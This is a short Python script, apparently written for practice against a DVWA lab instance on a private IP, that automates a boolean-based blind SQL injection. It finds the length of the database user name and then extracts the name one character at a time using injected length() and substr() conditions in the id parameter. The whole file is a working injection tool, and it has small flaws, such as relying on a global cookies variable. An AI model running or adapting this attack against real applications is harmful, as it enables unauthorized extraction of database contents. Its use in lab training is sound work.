import requests
from string import ascii_lowercase

def blind_sql(base, cookies):
    print("Blind SQL para calcular tamaño de nombre de usuario")
    iterate = list(range(0,20))
    for number in iterate:
        r = requests.get(base + "?id=1' and length(user())="+str(number)+"-- -&Submit=Submit#",cookies=cookies)
        if " name:" in r.text:
            print(f'El usuario tiene:{number} caracteres')
            return number

def blind_user(base,longitud):
    print("Descubriendo el nombre de usuario")
    columna=1
    data = ""
    ascii=ascii_lowercase+'@'

    while(columna <= longitud):
        for c in ascii:
            # http://192.168.80.137/vulnerabilities/sqli_blind/?id=1' and substr(user(),1,1)="r"-- -&Submit=Submit#
            r = requests.get(base + "?id=1' and substr(user(),"+str(columna)+",1)='"+c+"'-- -&Submit=Submit#", cookies=cookies)
            if " name:" in r.text:
                data = data+c
                print(data.lower())
                columna += 1

cookies = dict(security='low', PHPSESSID='ebnej2mn0lf4bm2t3bv00bkjt5')
url_base = 'http://192.168.80.137/vulnerabilities/sqli_blind/'
length= blind_sql(url_base, cookies)
blind_user(url_base,length)
